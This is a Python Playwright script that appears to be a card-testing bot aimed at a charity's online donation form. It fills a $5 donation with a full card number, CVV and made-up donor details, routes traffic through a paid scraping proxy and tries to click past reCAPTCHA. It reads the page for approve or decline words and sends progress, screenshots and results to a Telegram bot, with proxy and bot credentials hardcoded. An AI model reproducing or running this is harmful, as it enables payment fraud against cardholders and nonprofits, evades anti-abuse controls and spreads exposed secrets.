#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Gift of Life Donation v8 — fix fills, amount, apt, captcha
"""

import os
import time
import json
import requests
import traceback

try:
    from playwright.sync_api import sync_playwright
except ImportError:
    os.system("pip install playwright")
    os.system("playwright install chromium")
    from playwright.sync_api import sync_playwright

# ═══════════════════════════════════════════════════
BOT_TOKEN = "8647240736:AAEGXuwmtZkUvAfbURX2BcyyuoWD-TekP_0"
CHAT_ID = 6843321125

BD_HOST = "brd.superproxy.io"
BD_PORT = "9222"
BD_USER = "brd-customer-hl_24c8058e-zone-scraping_browser1"
BD_PASS = "eyr0v46j28pi"

TARGET_URL = "https://gift-of-life.org/make-a-donation/"

FIRST_NAME = "Wafa"
LAST_NAME = "Bro"
EMAIL = "wafabro980@gmail.com"
PHONE = "2019679866"
ADDRESS_1 = "W356"
ADDRESS_2 = "Apt 12"          # Apt/Suite/Unit/Other — عشان يبقى فيه قيمة
CITY = "Carifnia"
STATE_VALUE = "1305"          # California
ZIP = "90011"

CARD_NUMBER = "5178057879094972"
CARD_NAME = "Wafa Bro"
CARD_MONTH = "08"
CARD_YEAR = "2030"
CARD_CVV = "123"
CARD_TYPE = "MasterCard"

DONATION_AMOUNT = "5"

P = "_ArrevaOnlineDonationsPortlet_WAR_ArrevaOnlineDonationsPortlet_:form1:"


def sid(name):
    return f'[id="{P}{name}"]'


def tg_msg(text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            data={"chat_id": CHAT_ID, "text": text[:4000], "parse_mode": "HTML"},
            timeout=15
        )
    except Exception as e:
        print(f"TG msg error: {e}", flush=True)


def tg_photo(path, caption=""):
    try:
        with open(path, "rb") as f:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                data={"chat_id": CHAT_ID, "caption": caption[:1000]},
                files={"photo": f},
                timeout=30
            )
    except Exception as e:
        print(f"TG photo error: {e}", flush=True)


def dump_frames(page, label="FRAMES"):
    try:
        info = []
        for i, f in enumerate(page.frames):
            try:
                info.append(f"#{i} name='{f.name or ''}' url='{(f.url or '')[:80]}'")
            except Exception:
                info.append(f"#{i} (unreadable)")
        tg_msg(f"📋 {label} ({len(info)}):\n" + "\n".join(info))
    except Exception as e:
        tg_msg(f"⚠️ dump_frames: {e}")


def find_donation_frame(page, total_seconds=120):
    start = time.time()
    attempt = 0
    while time.time() - start < total_seconds:
        attempt += 1
        for f in page.frames:
            try:
                if f.name == "objectForm":
                    try:
                        f.locator('[id*="datafirst"]').first.wait_for(state="attached", timeout=2000)
                        return f, attempt
                    except Exception:
                        pass
            except Exception:
                pass
        for f in page.frames:
            try:
                u = f.url or ""
                if "donate-now" in u and "Arreva" in u:
                    try:
                        f.locator('[id*="datafirst"]').first.wait_for(state="attached", timeout=2000)
                        return f, attempt
                    except Exception:
                        pass
            except Exception:
                pass
        if attempt % 10 == 0:
            dump_frames(page, f"Attempt {attempt}")
        time.sleep(2)
    return None, attempt


def fill(frame, selector, value, label=""):
    """fill بسيط: fill() + input event بدون blur"""
    try:
        el = frame.locator(selector).first
        el.wait_for(state="visible", timeout=10000)
        el.fill(str(value), timeout=5000)
        el.evaluate("el => { el.dispatchEvent(new Event('input',{bubbles:true})); el.dispatchEvent(new Event('change',{bubbles:true})); }")
        # تحقق من القيمة الفعلية
        actual = el.input_value(timeout=3000)
        ok = (actual == str(value))
        tg_msg(f"{'✅' if ok else '⚠️'} {label or selector}: set='{actual}'" + ("" if ok else f" (wanted '{value}')"))
        return ok
    except Exception as e:
        tg_msg(f"❌ {label or selector}: {str(e)[:150]}")
        return False


def fill_js(frame, field_id_suffix, value, label=""):
    """fill عن طريق JS مباشرة لضمان القيمة"""
    try:
        frame.evaluate(
            """([idSuffix, val]) => {
                const el = document.getElementById(idSuffix);
                if (!el) return false;
                el.focus();
                el.value = val;
                el.dispatchEvent(new Event('input',{bubbles:true}));
                el.dispatchEvent(new Event('change',{bubbles:true}));
                return true;
            }""",
            [f"{P}{field_id_suffix}", str(value)]
        )
        tg_msg(f"✅ {label or field_id_suffix}: JS set")
        return True
    except Exception as e:
        tg_msg(f"❌ JS {label or field_id_suffix}: {str(e)[:150]}")
        return False


def select_option(frame, selector, value, label="", by_label=False):
    try:
        el = frame.locator(selector).first
        el.wait_for(state="attached", timeout=10000)
        if by_label:
            el.select_option(label=str(value), timeout=5000)
        else:
            el.select_option(value=str(value), timeout=5000)
        el.evaluate("el => el.dispatchEvent(new Event('change',{bubbles:true}))")
        tg_msg(f"✅ {label or selector}: selected")
        return True
    except Exception as e:
        tg_msg(f"❌ {label or selector}: {str(e)[:150]}")
        return False


def click(frame, selector, label=""):
    try:
        el = frame.locator(selector).first
        el.wait_for(state="visible", timeout=10000)
        el.click(timeout=5000)
        tg_msg(f"✅ {label or selector}: clicked")
        return True
    except Exception as e:
        tg_msg(f"❌ {label or selector}: {str(e)[:150]}")
        return False


def check_reject_in_text(text):
    for line in text.split("\n"):
        l = line.strip()
        if "REJECT" in l.upper() or "DECLINED" in l.upper():
            return l
    return None


def set_amount(frame, amount):
    """يختار Other ويحط المبلغ بـ JS ويتحقق"""
    tg_msg(f"🔄 Setting amount = {amount}")

    # 1) اختار Other
    try:
        other_radio = frame.locator(sid("rb_amount:4"))
        other_radio.wait_for(state="visible", timeout=10000)
        other_radio.check(timeout=5000)
        tg_msg("✅ Other radio checked")
    except Exception as e:
        tg_msg(f"⚠️ Other radio: {str(e)[:120]}")
        try:
            other_radio.click(timeout=5000)
            tg_msg("✅ Other radio clicked (fallback)")
        except Exception:
            pass

    # 2) استنى حقل other_amount يظهر
    time.sleep(3)
    try:
        frame.locator('input[id*="other_amount"]').first.wait_for(state="visible", timeout=15000)
        tg_msg("✅ other_amount is visible")
    except Exception as e:
        tg_msg(f"⚠️ other_amount not visible: {str(e)[:100]}")

    # 3) حط المبلغ بـ JS
    ok = frame.evaluate(
        """(amt) => {
            const el = document.querySelector('input[id*="other_amount"]');
            if (!el) return false;
            el.focus();
            el.value = amt;
            el.dispatchEvent(new Event('input',{bubbles:true}));
            el.dispatchEvent(new Event('change',{bubbles:true}));
            el.blur();
            return true;
        }""",
        str(amount)
    )
    tg_msg(f"{'✅' if ok else '❌'} amount set via JS")

    time.sleep(2)

    # 4) تحقق
    try:
        check = frame.evaluate(
            """() => {
                const oa = document.querySelector('input[id*="other_amount"]');
                const lt = document.getElementById('label_total_amount');
                return {
                    other_value: oa ? oa.value : null,
                    total_label: lt ? lt.value : null
                };
            }"""
        )
        tg_msg(f"📋 Amount check: {json.dumps(check, ensure_ascii=False)}")
    except Exception as e:
        tg_msg(f"⚠️ amount check: {str(e)[:120]}")


def check_and_solve_captcha(frame, page):
    """يتحقق من reCAPTCHA ويحاول يحلها"""
    try:
        token = frame.evaluate("""() => {
            const ta = document.querySelector('textarea[name="g-recaptcha-response"]');
            return ta ? ta.value : '';
        }""")
        tg_msg(f"📌 reCAPTCHA token len = {len(token) if token else 0}")
        if token and len(token) > 20:
            return True
    except Exception:
        pass

    tg_msg("🔄 Trying to solve reCAPTCHA...")
    try:
        # لو فيه anchor frame
        for f in page.frames:
            try:
                if "recaptcha/api2/anchor" in (f.url or ""):
                    checkbox = f.locator("#recaptcha-anchor").first
                    checkbox.wait_for(state="attached", timeout=8000)
                    checkbox.click(force=True, timeout=5000)
                    tg_msg("✅ Clicked reCAPTCHA checkbox")
                    time.sleep(5)
                    break
            except Exception:
                continue

        # تحقق تاني
        token = frame.evaluate("""() => {
            const ta = document.querySelector('textarea[name="g-recaptcha-response"]');
            return ta ? ta.value : '';
        }""")
        if token and len(token) > 20:
            tg_msg(f"✅ reCAPTCHA solved! len={len(token)}")
            return True
        else:
            tg_msg("⚠️ reCAPTCHA still empty")
    except Exception as e:
        tg_msg(f"⚠️ captcha solve: {str(e)[:150]}")
    return False


def run():
    tg_msg("🚀 Gift of Life Donation v8 — Start")

    cdp_url = f"wss://{BD_USER}:{BD_PASS}@{BD_HOST}:{BD_PORT}"

    try:
        pw = sync_playwright().start()
        browser = pw.chromium.connect_over_cdp(cdp_url, timeout=120000)
        tg_msg("✅ Connected")
    except Exception as e:
        tg_msg(f"❌ Connect: {str(e)[:200]}")
        return

    context = browser.new_context(
        viewport={"width": 1366, "height": 900},
        user_agent=("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"),
        locale="en-US",
    )
    page = context.new_page()
    page.set_default_timeout(60000)

    # 1. فتح الصفحة
    tg_msg("🔄 [1] Opening page...")
    try:
        page.goto(TARGET_URL, wait_until="domcontentloaded", timeout=60000)
        time.sleep(10)
    except Exception as e:
        tg_msg(f"❌ Load: {str(e)[:200]}")
        return
    tg_msg("✅ Page loaded")

    # 2. iframe
    tg_msg("🔄 [2] Searching for donation iframe (up to 120s)...")
    frame, attempts = find_donation_frame(page, 120)
    if not frame:
        tg_msg("❌ iframe not found after 120s — reloading once")
        try:
            page.reload(wait_until="domcontentloaded", timeout=60000)
            time.sleep(15)
        except Exception:
            pass
        frame, attempts = find_donation_frame(page, 90)
    if not frame:
        tg_msg("❌ iframe not found")
        dump_frames(page, "FINAL FRAMES")
        return
    tg_msg(f"✅ Found frame (attempts={attempts})")
    time.sleep(5)

    # 3. المبلغ
    tg_msg("🔄 [3] Setting amount...")
    set_amount(frame, DONATION_AMOUNT)

    # 4. بيانات المتبرع
    tg_msg("🔄 [4] Filling donor info...")
    fill(frame, sid("datafirst"), FIRST_NAME, "First name")
    fill(frame, sid("datalast"), LAST_NAME, "Last name")
    fill(frame, sid("email"), EMAIL, "Email")
    fill(frame, sid("data_phone"), PHONE, "Phone")
    fill(frame, sid("data_address_one"), ADDRESS_1, "Address")
    fill(frame, sid("data_address_two"), ADDRESS_2, "Apt/Suite")
    fill(frame, sid("data_address_city"), CITY, "City")
    fill(frame, sid("data_address_zip"), ZIP, "Zip")

    # Country
    try:
        us_value = frame.evaluate(f"""() => {{
            const sel = document.querySelector('select[id="{P}data_Rcountry"]');
            if (!sel) return null;
            for (const o of sel.options) {{
                const t = o.text.trim().toLowerCase();
                if (t === 'united states' || t === 'usa' || t === 'us') return o.value;
            }}
            return null;
        }}""")
        if us_value:
            select_option(frame, sid("data_Rcountry"), us_value, f"Country (US={us_value})")
    except Exception as e:
        tg_msg(f"⚠️ Country: {str(e)[:150]}")

    select_option(frame, sid("data_Rstate"), STATE_VALUE, "State (CA)")

    # 5. البطاقة
    tg_msg("🔄 [5] Filling card info...")
    time.sleep(1)
    fill(frame, sid("nameOnCard"), CARD_NAME, "Card name")
    fill(frame, sid("cardNumber"), CARD_NUMBER, "Card number")
    fill(frame, sid("cardCSV"), CARD_CVV, "CVV")

    # cardType — جرّب select[name] بدل select[id]
    if not select_option(frame, sid("cardType"), CARD_TYPE, "Card type (by id)"):
        select_option(frame, f'select[name="{P}cardType"]', CARD_TYPE, "Card type (by name)")

    select_option(frame, sid("expiration_date_month"), CARD_MONTH, "Exp month")
    select_option(frame, sid("expiration_date_year"), CARD_YEAR, "Exp year")

    # 6. Screenshot
    try:
        page.screenshot(path="/tmp/before_submit.png", full_page=True)
        tg_photo("/tmp/before_submit.png", "📸 Before submit")
    except Exception:
        pass

    # 7. captcha
    tg_msg("🔄 [7] Checking reCAPTCHA...")
    captcha_ok = check_and_solve_captcha(frame, page)
    if not captcha_ok:
        tg_msg("⚠️ captcha unresolved — submit may fail")

    # 8. Pre-submit
    tg_msg("🔄 [8] Verifying...")
    try:
        vals = frame.evaluate(f"""() => {{
            const g = (n) => {{
                const el = document.getElementById('{P}' + n);
                return el ? el.value : null;
            }};
            const oa = document.querySelector('input[id*="other_amount"]');
            const lt = document.getElementById('label_total_amount');
            return {{
                first: g('datafirst'),
                last: g('datalast'),
                email: g('email'),
                phone: g('data_phone'),
                addr1: g('data_address_one'),
                addr2: g('data_address_two'),
                city: g('data_address_city'),
                zip: g('data_address_zip'),
                card_name: g('nameOnCard'),
                card_num_len: (g('cardNumber') || '').length,
                cvv_len: (g('cardCSV') || '').length,
                exp_month: g('expiration_date_month'),
                exp_year: g('expiration_date_year'),
                card_type: g('cardType'),
                other_amount: oa ? oa.value : null,
                total_label: lt ? lt.value : null,
                recaptcha_len: (g('g-recaptcha-response') || '').length,
            }};
        }}""")
        tg_msg(f"📋 Pre-submit:\n<pre>{json.dumps(vals, indent=1, ensure_ascii=False)}</pre>")
    except Exception as e:
        tg_msg(f"⚠️ Verify: {str(e)[:150]}")

    # 9. Submit
    tg_msg("🔄 [9] Clicking Submit...")
    if not click(frame, sid("j_idt1913"), "Submit"):
        try:
            frame.evaluate(f"""() => {{
                const btn = document.getElementById('{P}j_idt1913');
                if (btn) btn.click();
            }}""")
            tg_msg("✅ JS click sent")
        except Exception:
            pass

    time.sleep(10)

    # 10. النتيجة
    tg_msg("🔄 [10] Reading result...")
    time.sleep(10)

    try:
        page.screenshot(path="/tmp/result.png", full_page=True)
        tg_photo("/tmp/result.png", "📸 Result")
    except Exception:
        pass

    final_result = None
    try:
        iframe_text = frame.evaluate("() => document.body.innerText")
        r = check_reject_in_text(iframe_text)
        if r:
            final_result = r
            tg_msg(f"⛔ SERVER REJECT: {r}")
    except Exception:
        pass

    if not final_result:
        try:
            main_text = page.evaluate("document.body.innerText")
            r = check_reject_in_text(main_text)
            if r:
                final_result = r
                tg_msg(f"⛔ SERVER REJECT (main): {r}")
        except Exception:
            pass

    try:
        iframe_text = frame.evaluate("() => document.body.innerText")
        lines = []
        for line in iframe_text.split("\n"):
            l = line.strip()
            if any(k in l.lower() for k in ["success","approved","declin","error","invalid",
                                             "thank","confirm","failed","reject","captcha",
                                             "verified","otp","verification","limit","enter"]):
                lines.append(l)
        if lines:
            tg_msg("📊 Result:\n" + "\n".join(lines[:25]))
        else:
            tg_msg("⚠️ no keywords. iframe preview:\n<pre>" + iframe_text[:1500] + "</pre>")
    except Exception as e:
        tg_msg(f"⚠️ read: {str(e)[:150]}")

    if final_result:
        tg_msg(f"🏁 FINAL RESULT: {final_result}")
    else:
        tg_msg("🏁 FINAL RESULT: unknown (check screenshot)")

    tg_msg("✅ DONE")

    try: context.close()
    except: pass
    try: browser.close()
    except: pass
    try: pw.stop()
    except: pass


if __name__ == "__main__":
    try:
        run()
    except Exception as e:
        tg_msg(f"❌ FATAL:\n{traceback.format_exc()[:3500]}")
